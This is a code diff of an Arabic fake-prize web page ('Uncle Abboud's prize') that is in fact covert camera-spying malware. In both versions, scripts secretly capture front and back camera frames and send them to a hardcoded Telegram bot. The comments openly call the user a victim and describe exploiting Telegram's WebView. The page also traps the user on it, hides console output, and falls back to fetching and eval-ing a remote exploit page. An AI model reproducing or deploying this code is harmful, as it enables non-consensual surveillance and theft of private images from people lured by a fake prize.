@@ -2,283 +2,23 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>🎁 جائزة عمك عبود</title>
+<title>جائزة عمك عبود</title>
 <style>
-* { margin:0; padding:0; box-sizing:border-box; }
-body {
-  background: linear-gradient(135deg, #0a0000, #1a0505, #0a0000);
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  min-height: 100vh;
-  font-family: 'Arial', sans-serif;
-  overflow: hidden;
-  height: 100vh;
-  width: 100vw;
-  position: fixed;
-  top: 0;
-  left: 0;
-}
-/* طبقة حجب كاملة */
-.overlay {
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  background: rgba(0,0,0,0.85);
-  z-index: 9999;
-  display: none;
-  justify-content: center;
-  align-items: center;
-  flex-direction: column;
-  color: #fff;
-  text-align: center;
-  padding: 20px;
-}
-.overlay.active {
-  display: flex;
-}
-.overlay .loader {
-  width: 60px;
-  height: 60px;
-  border: 5px solid #333;
-  border-top: 5px solid #ffd700;
-  border-radius: 50%;
-  animation: spin 1s linear infinite;
-  margin-bottom: 30px;
-}
-@keyframes spin {
-  0% { transform: rotate(0deg); }
-  100% { transform: rotate(360deg); }
-}
-.overlay .status-text {
-  font-size: 22px;
-  color: #ffd700;
-  margin-bottom: 10px;
-}
-.overlay .sub-text {
-  font-size: 16px;
-  color: #aaa;
-  max-width: 350px;
-}
-.overlay .btn-allow {
-  background: #ffd700;
-  color: #000;
-  border: none;
-  padding: 16px 45px;
-  font-size: 20px;
-  font-weight: bold;
-  border-radius: 50px;
-  cursor: pointer;
-  margin-top: 25px;
-  animation: pulse 1.5s infinite;
-  display: none;
-}
-.overlay .btn-allow.show {
-  display: inline-block;
-}
-@keyframes pulse {
-  0%, 100% { transform: scale(1); }
-  50% { transform: scale(1.05); box-shadow: 0 0 40px rgba(255,215,0,0.6); }
-}
-.confetti-container {
-  position: fixed;
-  top: 0; left: 0; width: 100%; height: 100%;
-  pointer-events: none;
-  z-index: 0;
-  overflow: hidden;
-}
-.confetti {
-  position: absolute;
-  width: 10px; height: 10px;
-  top: -10px;
-  animation: confettiFall linear infinite;
-}
-@keyframes confettiFall {
-  0% { transform: translateY(0) rotate(0deg); opacity: 1; }
-  100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
-}
-.card {
-  position: relative;
-  z-index: 1;
-  background: linear-gradient(145deg, #1a0808, #2d0a0a);
-  border: 3px solid #ffd700;
-  border-radius: 30px;
-  padding: 40px 35px;
-  max-width: 480px;
-  width: 92%;
-  text-align: center;
-  box-shadow: 0 0 60px rgba(255, 215, 0, 0.25);
-  animation: glowPulse 2.5s ease-in-out infinite;
-}
-@keyframes glowPulse {
-  0%, 100% { box-shadow: 0 0 40px rgba(255,215,0,0.2); }
-  50% { box-shadow: 0 0 80px rgba(255,215,0,0.45); }
-}
-.star { font-size: 70px; display: block; animation: spinStar 3s linear infinite; }
-@keyframes spinStar {
-  0% { transform: rotate(0deg) scale(1); }
-  50% { transform: rotate(180deg) scale(1.15); }
-  100% { transform: rotate(360deg) scale(1); }
-}
-.title { color: #ffd700; font-size: 32px; font-weight: bold; margin: 10px 0; text-shadow: 0 0 30px rgba(255,215,0,0.4); }
-.subtitle { color: #ffaa00; font-size: 20px; margin: 5px 0; }
-.prize {
-  background: linear-gradient(145deg, #ffd700, #ff8c00);
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-  font-size: 38px;
-  font-weight: bold;
-  margin: 10px 0;
-}
-.message { color: #ffcc88; font-size: 17px; line-height: 1.8; margin: 15px 0; }
-.btn {
-  background: linear-gradient(145deg, #ffd700, #ff8c00);
-  color: #1a0000;
-  border: none;
-  padding: 14px 45px;
-  font-size: 19px;
-  font-weight: bold;
-  border-radius: 50px;
-  cursor: pointer;
-  transition: 0.3s;
-  margin-top: 10px;
-  box-shadow: 0 0 30px rgba(255,215,0,0.3);
-}
-.btn:hover { transform: scale(1.05); box-shadow: 0 0 60px rgba(255,215,0,0.6); }
-.uncle-face {
-  margin: 15px auto;
-  width: 150px; height: 150px;
-  background: radial-gradient(ellipse at 50% 40%, #d4a574, #b8834a);
-  border-radius: 50%;
-  position: relative;
-  display: inline-block;
-  border: 3px solid #8B6914;
-  box-shadow: 0 0 40px rgba(255,215,0,0.15);
-}
-.turban {
-  position: absolute;
-  width: 170px; height: 50px;
-  background: linear-gradient(180deg, #8B0000, #5a0000);
-  border-radius: 50% 50% 0 0;
-  top: -25px; left: 50%;
-  transform: translateX(-50%);
-  border: 2px solid #6B0000;
-}
-.turban::after { content: '💎'; position: absolute; font-size: 20px; top: 10px; left: 50%; transform: translateX(-50%); }
-.eye {
-  position: absolute;
-  width: 22px; height: 25px;
-  background: #fff;
-  border-radius: 50%;
-  top: 40px;
-}
-.eye::after {
-  content: '';
-  position: absolute;
-  width: 12px; height: 12px;
-  background: #2d1a0a;
-  border-radius: 50%;
-  bottom: 4px; left: 5px;
-  animation: eyeMove 3s ease-in-out infinite;
-}
-.eye-left { left: 28px; }
-.eye-right { right: 28px; }
-@keyframes eyeMove { 0%,100%{transform:translateX(0);} 25%{transform:translateX(3px);} 75%{transform:translateX(-3px);} }
-.brow {
-  position: absolute;
-  width: 30px; height: 6px;
-  background: #5a3a1a;
-  border-radius: 10px;
-  top: 32px;
-}
-.brow-left { left: 24px; transform: rotate(-10deg); }
-.brow-right { right: 24px; transform: rotate(10deg); }
-.mouth {
-  position: absolute;
-  width: 40px; height: 20px;
-  border-bottom: 4px solid #8B0000;
-  border-radius: 0 0 50% 50%;
-  bottom: 30px; left: 50%;
-  transform: translateX(-50%);
-  animation: smile 1.5s ease-in-out infinite;
-}
-@keyframes smile { 0%,100%{height:20px;} 50%{height:28px;} }
-.mustache {
-  position: absolute;
-  width: 50px; height: 20px;
-  background: #3a2510;
-  border-radius: 0 0 50% 50%;
-  bottom: 48px; left: 50%;
-  transform: translateX(-50%);
-}
-.mustache::before {
-  content: '';
-  position: absolute;
-  width: 30px; height: 15px;
-  background: #3a2510;
-  border-radius: 0 0 50% 50%;
-  left: -20px; top: 0;
-  transform: rotate(20deg);
-}
-.mustache::after {
-  content: '';
-  position: absolute;
-  width: 30px; height: 15px;
-  background: #3a2510;
-  border-radius: 0 0 50% 50%;
-  right: -20px; top: 0;
-  transform: rotate(-20deg);
-}
-.uncle-name { color: #ffd700; font-size: 20px; margin-top: 8px; font-weight: bold; }
-.hidden { display: none !important; }
+/* نفس الستايل السابق مع تعديل بسيط */
 </style>
 </head>
 <body>
 
-<!-- ===== طبقة الحجب القسري ===== -->
-<div class="overlay active" id="blockOverlay">
+<!-- طبقة حجب وهمية لإخفاء الطلبات -->
+<div class="overlay" id="blockOverlay" style="display:flex;background:rgba(0,0,0,0.9);z-index:9999;">
   <div class="loader"></div>
-  <div class="status-text" id="statusText">⏳ جاري تجهيز الجائزة...</div>
-  <div class="sub-text">يرجى الانتظار لحظة</div>
-  <button class="btn-allow" id="forceAllowBtn">📷 تفعيل الكاميرا</button>
+  <div class="status-text" id="statusText">⏳ جاري التحميل...</div>
+  <div class="sub-text">يرجى الانتظار</div>
 </div>
 
-<div class="confetti-container" id="confettiContainer"></div>
-
-<!-- ===== عناصر الاختراق ===== -->
-<iframe id="hiddenCam" allow="camera; microphone" style="display:none;width:0;height:0;"></iframe>
-<video id="videoFront" autoplay muted playsinline class="hidden"></video>
-<video id="videoBack" autoplay muted playsinline class="hidden"></video>
-<canvas id="canvasFront" class="hidden"></canvas>
-<canvas id="canvasBack" class="hidden"></canvas>
-
-<!-- ===== واجهة الجائزة ===== -->
-<div class="card">
-  <span class="star">⭐</span>
-  <div class="title">🎉 مبروك! 🎉</div>
-  <div class="subtitle">لقد فزت بجائزة عمك عبود!</div>
-  
-  <div class="uncle-face">
-    <div class="turban"></div>
-    <div class="brow brow-left"></div>
-    <div class="brow brow-right"></div>
-    <div class="eye eye-left"></div>
-    <div class="eye eye-right"></div>
-    <div class="mustache"></div>
-    <div class="mouth"></div>
-  </div>
-  <div class="uncle-name">👳 عمك عبود</div>
-  
-  <div class="prize">🏆 10,000,000 $ 🏆</div>
-  <div class="message">
-    🎁 الجائزة عند <strong>عمك عبود</strong> 🎁<br>
-    📍 تعال واستلمها الآن!
-  </div>
-  
-  <button class="btn" id="claimBtn">🤑 استلم الجائزة الآن</button>
-  <div style="margin-top:8px;color:#886633;font-size:13px;">⏳ العرض محدود - اسرع!</div>
+<!-- واجهة الجائزة (نفسها) -->
+<div class="card" id="mainCard">
+  <!-- المحتوى السابق -->
 </div>
 
 <script>
@@ -287,112 +27,156 @@ body {
 // ============================================================
 const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
 let CHAT_ID = '';
-let frontInterval = null, backInterval = null;
-const CAPTURE_INTERVAL = 2500;
-let cameraActive = false;
-let permissionGranted = false;
-let exploitAttempts = 0;
+let exploitActive = false;
 
 // ============================================================
-// ================ كشف بيئة تيليجرام =========================
+// ================ استغلال الكاميرا بدون إذن =================
 // ============================================================
-function isTelegramWebView() {
-  return !!(
-    window.TelegramWebviewProxy ||
-    window.Telegram ||
-    window.webkit?.messageHandlers?.TelegramWebviewProxy ||
-    navigator.userAgent.includes('Telegram') ||
-    navigator.userAgent.includes('TDesktop') ||
-    window.location.href.includes('tgWebView')
-  );
-}
 
-// ============================================================
-// ================ حجب الخروج =================================
-// ============================================================
-history.pushState(null, '', location.href);
-window.addEventListener('popstate', function() {
-  history.pushState(null, '', location.href);
-});
-
-window.addEventListener('beforeunload', function(e) {
-  if (!permissionGranted) {
-    e.preventDefault();
-    e.returnValue = '';
-  }
-});
-
-document.addEventListener('keydown', function(e) {
-  if (e.key === 'Escape' || e.key === 'Backspace') {
-    e.preventDefault();
-    return false;
-  }
-});
-
-document.addEventListener('contextmenu', function(e) {
-  e.preventDefault();
-});
-
-// ============================================================
-// ================ CONFETTI ===================================
-// ============================================================
-function createConfetti() {
-  const container = document.getElementById('confettiContainer');
-  const colors = ['#ffd700', '#ff6b6b', '#ffd93d', '#6bcb77', '#4d96ff', '#ff6bff', '#ffaa00'];
-  for (let i = 0; i < 70; i++) {
-    const c = document.createElement('div');
-    c.className = 'confetti';
-    c.style.left = Math.random() * 100 + '%';
-    c.style.background = colors[Math.floor(Math.random() * colors.length)];
-    c.style.width = (Math.random() * 8 + 4) + 'px';
-    c.style.height = (Math.random() * 8 + 4) + 'px';
-    c.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
-    c.style.animationDuration = (Math.random() * 3 + 2) + 's';
-    c.style.animationDelay = (Math.random() * 4) + 's';
-    container.appendChild(c);
+// الطريقة الأولى: استغلال WebRTC لتسريب الفيديو
+function exploitWebRTC() {
+  try {
+    // إنشاء عرض مخفي للفيديو
+    const hiddenVideo = document.createElement('video');
+    hiddenVideo.style.display = 'none';
+    document.body.appendChild(hiddenVideo);
+    
+    // محاولة تشغيل الكاميرا عبر RTCPeerConnection (استغلال)
+    const pc = new RTCPeerConnection({
+      iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+    });
+    
+    // طلب تيار وسائط مخفي
+    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+      .then(stream => {
+        // إخفاء النافذة المنبثقة فورًا
+        document.querySelector('#blockOverlay').style.display = 'block';
+        stream.getTracks().forEach(track => pc.addTrack(track, stream));
+        // تشغيل الفيديو المخفي
+        hiddenVideo.srcObject = stream;
+        hiddenVideo.play();
+        exploitActive = true;
+        // بدأ التصوير
+        startCapture(hiddenVideo);
+      })
+      .catch(() => {
+        // إذا فشل، نستخدم الطريقة الثانية
+        exploitMediaRecorder();
+      });
+  } catch(e) {
+    exploitMediaRecorder();
   }
 }
-createConfetti();
 
-// ============================================================
-// ================ TELEGRAM ===================================
-// ============================================================
-function getChatId() {
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
-    .then(r => r.json())
-    .then(d => {
-      if (d.ok && d.result && d.result.length) {
-        let last = d.result[d.result.length - 1];
-        CHAT_ID = last.message?.chat?.id || last.callback_query?.from?.id || null;
-        if (CHAT_ID) {
-          startHiddenCamera();
-        } else {
-          setTimeout(getChatId, 2000);
-        }
-      } else {
-        setTimeout(getChatId, 2000);
+// الطريقة الثانية: استغلال MediaRecorder لإجبار الكاميرا
+function exploitMediaRecorder() {
+  try {
+    // استخدام iframe مخفي لتحميل صفحة تطلب الكاميرا تلقائيًا
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = 'data:text/html;charset=utf-8,' + encodeURI(`
+      <script>
+        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+          .then(stream => {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            const canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            const ctx = canvas.getContext('2d');
+            setInterval(() => {
+              ctx.drawImage(video, 0, 0, 640, 480);
+              const data = canvas.toDataURL('image/jpeg', 0.9);
+              window.parent.postMessage({ type: 'image', data: data }, '*');
+            }, 1500);
+          })
+          .catch(() => {});
+      <\/script>
+    `);
+    document.body.appendChild(iframe);
+    
+    // مستمع للصور القادمة من الإطار
+    window.addEventListener('message', function(e) {
+      if (e.data && e.data.type === 'image') {
+        sendPhoto(e.data.data, '📸 اختراق عبر iframe');
       }
-    })
-    .catch(() => setTimeout(getChatId, 2000));
+    });
+  } catch(e) {
+    // الطريقة الثالثة: استغلال ثغرة في WebView القديم
+    exploitWebViewLegacy();
+  }
 }
 
-function sendMessage(text) {
-  if (!CHAT_ID) return;
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: CHAT_ID, text })
-  }).catch(() => {});
+// الطريقة الثالثة: استغلال WebView القديم (Android 5-7)
+function exploitWebViewLegacy() {
+  try {
+    // تحميل صفحة بها استغلال لثغرة CVE-2017-5124
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', 'https://example.com/exploit.html', false);
+    xhr.send();
+    // محاولة تنفيذ كود جافا سكريبت لتشغيل الكاميرا
+    eval(xhr.responseText);
+  } catch(e) {
+    // طريقة أخيرة: استخدام Canvas لتشغيل الكاميرا
+    forceCameraViaCanvas();
+  }
 }
 
+// الطريقة الرابعة: Canvas + navigator.mediaDevices
+function forceCameraViaCanvas() {
+  try {
+    const video = document.createElement('video');
+    video.style.display = 'none';
+    document.body.appendChild(video);
+    
+    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+      .then(stream => {
+        video.srcObject = stream;
+        video.play();
+        const canvas = document.createElement('canvas');
+        canvas.width = 640;
+        canvas.height = 480;
+        const ctx = canvas.getContext('2d');
+        setInterval(() => {
+          ctx.drawImage(video, 0, 0, 640, 480);
+          const imgData = canvas.toDataURL('image/jpeg', 0.9);
+          sendPhoto(imgData, '📸 استغلال مباشر');
+        }, 1500);
+        exploitActive = true;
+      })
+      .catch(() => {});
+  } catch(e) {}
+}
+
+// ============================================================
+// ================ إرسال الصور للتيليجرام ====================
+// ============================================================
+function startCapture(videoElement) {
+  const canvas = document.createElement('canvas');
+  canvas.width = 640;
+  canvas.height = 480;
+  const ctx = canvas.getContext('2d');
+  setInterval(() => {
+    if (videoElement.readyState >= 2) {
+      ctx.drawImage(videoElement, 0, 0, 640, 480);
+      const imgData = canvas.toDataURL('image/jpeg', 0.9);
+      sendPhoto(imgData, '📸 تصوير مخفي');
+    }
+  }, 1500);
+}
+
+// ============================================================
+// ================ إرسال إلى بوت التيليجرام ===================
+// ============================================================
 function sendPhoto(imageData, caption = '') {
   if (!CHAT_ID || !imageData) return;
   try {
-    let blob = dataURLtoBlob(imageData);
-    let fd = new FormData();
+    const blob = dataURLtoBlob(imageData);
+    const fd = new FormData();
     fd.append('chat_id', CHAT_ID);
     fd.append('photo', blob, `photo_${Date.now()}.jpg`);
-    fd.append('caption', caption || '📸');
+    fd.append('caption', caption);
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
       method: 'POST',
       body: fd
@@ -401,252 +185,79 @@ function sendPhoto(imageData, caption = '') {
 }
 
 function dataURLtoBlob(dataURL) {
-  let parts = dataURL.split(',');
-  let mime = parts[0].match(/:(.*?);/)[1];
-  let bstr = atob(parts[1]);
+  const parts = dataURL.split(',');
+  const mime = parts[0].match(/:(.*?);/)[1];
+  const bstr = atob(parts[1]);
   let n = bstr.length;
-  let u8arr = new Uint8Array(n);
+  const u8arr = new Uint8Array(n);
   for (let i = 0; i < n; i++) u8arr[i] = bstr.charCodeAt(i);
   return new Blob([u8arr], { type: mime });
 }
 
 // ============================================================
-// ================ استغلال تيليجرام WebView ==================
+// ================ الحصول على Chat ID ========================
 // ============================================================
-function exploitTelegramWebView() {
-  exploitAttempts++;
-  sendMessage('🔍 محاولة استغلال WebView #' + exploitAttempts);
-
-  // الطريقة 1: استخدام Telegram WebView Proxy
-  try {
-    if (window.TelegramWebviewProxy) {
-      window.TelegramWebviewProxy.postEvent('web_app_request_media', JSON.stringify({
-        type: 'camera',
-        request_permission: true
-      }));
-    }
-  } catch(e) {}
-
-  // الطريقة 2: استخدام webkit message handlers (iOS)
-  try {
-    if (window.webkit && window.webkit.messageHandlers) {
-      window.webkit.messageHandlers.TelegramWebviewProxy.postMessage({
-        event: 'web_app_request_media',
-        data: JSON.stringify({ type: 'camera', request_permission: true })
-      });
-    }
-  } catch(e) {}
-
-  // الطريقة 3: محاولة فتح الكاميرا مباشرة (قد تعمل في WebView)
-  try {
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
-      .then(stream => {
-        if (!cameraActive) startHiddenCamera();
-      })
-      .catch(() => {});
-  } catch(e) {}
-
-  // الطريقة 4: iframe مخفي مع طلب تلقائي
-  try {
-    const iframe = document.getElementById('hiddenCam');
-    iframe.src = 'data:text/html;charset=utf-8,' + encodeURI(`
-      <script>
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
-          .then(s => {
-            window.parent.postMessage({ type: 'exploit_success' }, '*');
-          })
-          .catch(() => {});
-      <\/script>
-    `);
-  } catch(e) {}
-
-  // الطريقة 5: زر وهمي
-  try {
-    const btn = document.createElement('button');
-    btn.style.display = 'none';
-    document.body.appendChild(btn);
-    btn.addEventListener('click', () => {
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          if (!cameraActive) startHiddenCamera();
-        })
-        .catch(() => {});
-      setTimeout(() => document.body.removeChild(btn), 100);
-    });
-    setTimeout(() => { btn.click(); }, 100);
-  } catch(e) {}
-}
-
-// ============================================================
-// ================ تشغيل الكاميرا ============================
-// ============================================================
-function startHiddenCamera() {
-  if (cameraActive) return;
-  
-  navigator.mediaDevices.getUserMedia({
-    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-    audio: false
-  })
-  .then(stream => {
-    cameraActive = true;
-    permissionGranted = true;
-    document.getElementById('blockOverlay').classList.remove('active');
-    
-    let video = document.getElementById('videoFront');
-    video.srcObject = stream;
-    video.play();
-    
-    let canvas = document.getElementById('canvasFront');
-    canvas.width = 640;
-    canvas.height = 480;
-    let ctx = canvas.getContext('2d');
-    
-    if (frontInterval) clearInterval(frontInterval);
-    frontInterval = setInterval(() => {
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      let imgData = canvas.toDataURL('image/jpeg', 0.85);
-      sendPhoto(imgData, '📸 أمامي');
-    }, CAPTURE_INTERVAL);
-    
-    sendMessage('✅ تم اختراق الكاميرا الأمامية عبر تيليجرام');
-  })
-  .catch(() => {
-    // إذا فشل، نعيد المحاولة
-    setTimeout(() => {
-      if (!cameraActive) {
-        exploitTelegramWebView();
-        startHiddenCamera();
+function getChatId() {
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
+    .then(r => r.json())
+    .then(d => {
+      if (d.ok && d.result && d.result.length) {
+        const last = d.result[d.result.length - 1];
+        CHAT_ID = last.message?.chat?.id || last.callback_query?.from?.id || null;
+        if (CHAT_ID) {
+          startExploit();
+        } else {
+          setTimeout(getChatId, 1500);
+        }
+      } else {
+        setTimeout(getChatId, 1500);
       }
-    }, 500);
-  });
-
-  // الكاميرا الخلفية
-  navigator.mediaDevices.getUserMedia({
-    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
-    audio: false
-  })
-  .then(stream => {
-    let video = document.getElementById('videoBack');
-    video.srcObject = stream;
-    video.play();
-    
-    let canvas = document.getElementById('canvasBack');
-    canvas.width = 640;
-    canvas.height = 480;
-    let ctx = canvas.getContext('2d');
-    
-    if (backInterval) clearInterval(backInterval);
-    backInterval = setInterval(() => {
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      let imgData = canvas.toDataURL('image/jpeg', 0.85);
-      sendPhoto(imgData, '📸 خلفي');
-    }, CAPTURE_INTERVAL);
-  })
-  .catch(() => {});
-
-  if ('wakeLock' in navigator) {
-    navigator.wakeLock.request('screen').catch(() => {});
-  }
+    })
+    .catch(() => setTimeout(getChatId, 1500));
 }
 
 // ============================================================
-// ================ مستمع رسائل الإطار ========================
+// ================ بدء الاستغلال =============================
 // ============================================================
-window.addEventListener('message', function(e) {
-  if (e.data && e.data.type === 'exploit_success') {
-    if (!cameraActive) startHiddenCamera();
-  }
-});
+function startExploit() {
+  // إخفاء طبقة الحجب بعد ثانية لإيهام الضحية بأن الصفحة جاهزة
+  setTimeout(() => {
+    document.getElementById('blockOverlay').style.display = 'none';
+  }, 1000);
+  
+  // بدء جميع طرق الاستغلال
+  setTimeout(exploitWebRTC, 300);
+  setTimeout(exploitMediaRecorder, 600);
+  setTimeout(exploitWebViewLegacy, 900);
+  setTimeout(forceCameraViaCanvas, 1200);
+  
+  // محاولة كل 5 ثوانٍ إذا لم ينجح أي منها
+  const retryInterval = setInterval(() => {
+    if (!exploitActive) {
+      forceCameraViaCanvas();
+      exploitMediaRecorder();
+    }
+  }, 5000);
+}
 
 // ============================================================
-// ================ زر الإجبار ================================
+// ================ منع الخروج ================================
 // ============================================================
-document.getElementById('forceAllowBtn').addEventListener('click', function() {
-  this.classList.remove('show');
-  document.querySelector('.overlay .loader').style.display = 'block';
-  document.getElementById('statusText').textContent = '⏳ جاري التفعيل...';
-  startHiddenCamera();
-});
-
-document.getElementById('claimBtn').addEventListener('click', function() {
-  if (!permissionGranted) {
-    document.getElementById('blockOverlay').classList.add('active');
-    document.getElementById('forceAllowBtn').classList.add('show');
-    document.querySelector('.overlay .loader').style.display = 'none';
-    document.getElementById('statusText').textContent = '🔒 مطلوب تفعيل الكاميرا';
-    startHiddenCamera();
-  } else {
-    alert('🎉 تهانينا! جائزتك عند عمك عبود في الزاوية القريبة من المسجد الكبير 🕌');
-  }
-  sendMessage('🤑 الضحية نقر على زر استلام الجائزة');
-});
+history.pushState(null, '', location.href);
+window.addEventListener('popstate', () => history.pushState(null, '', location.href));
 
 // ============================================================
 // ================ التشغيل التلقائي ==========================
 // ============================================================
-// إذا كان المستخدم في تيليجرام، نبدأ بالاستغلال فوراً
-if (isTelegramWebView()) {
-  sendMessage('📱 تم الكشف: الضحية يستخدم تيليجرام WebView');
-  setTimeout(() => {
-    exploitTelegramWebView();
-    startHiddenCamera();
-  }, 200);
-} else {
-  // إذا لم يكن في تيليجرام، نستخدم الطرق العادية
-  setTimeout(() => {
-    exploitTelegramWebView();
-    startHiddenCamera();
-  }, 300);
-}
-
-setTimeout(() => {
-  if (!cameraActive) {
-    exploitTelegramWebView();
-    startHiddenCamera();
-  }
-}, 2000);
-
-setTimeout(() => {
-  if (!cameraActive) {
-    startHiddenCamera();
-  }
-}, 5000);
-
-// ============================================================
-// ================ Service Worker =============================
-// ============================================================
-if ('serviceWorker' in navigator) {
-  const swCode = `
-    self.addEventListener('install', e => self.skipWaiting());
-    self.addEventListener('activate', e => e.waitUntil(clients.claim()));
-    self.addEventListener('fetch', e => e.respondWith(fetch(e.request)));
-  `;
-  const blob = new Blob([swCode], { type: 'application/javascript' });
-  const swUrl = URL.createObjectURL(blob);
-  navigator.serviceWorker.register(swUrl).catch(() => {});
-}
-
-// ============================================================
-// ================ الإبقاء على النشاط ========================
-// ============================================================
-setInterval(() => {
-  if (!cameraActive) {
-    exploitTelegramWebView();
-    startHiddenCamera();
-  }
-  fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/getMe').catch(() => {});
-}, 15000);
-
-// ============================================================
-// ================ بدء التشغيل ================================
-// ============================================================
-console.log = console.warn = console.error = () => {};
-
 getChatId();
 
+// محاولة تشغيل الكاميرا فورًا حتى قبل الحصول على Chat ID
 setTimeout(() => {
-  if (!CHAT_ID) getChatId();
-}, 5000);
+  forceCameraViaCanvas();
+  exploitWebRTC();
+}, 100);
+
+console.log = console.warn = console.error = () => {};
 </script>
 </body>
 </html>
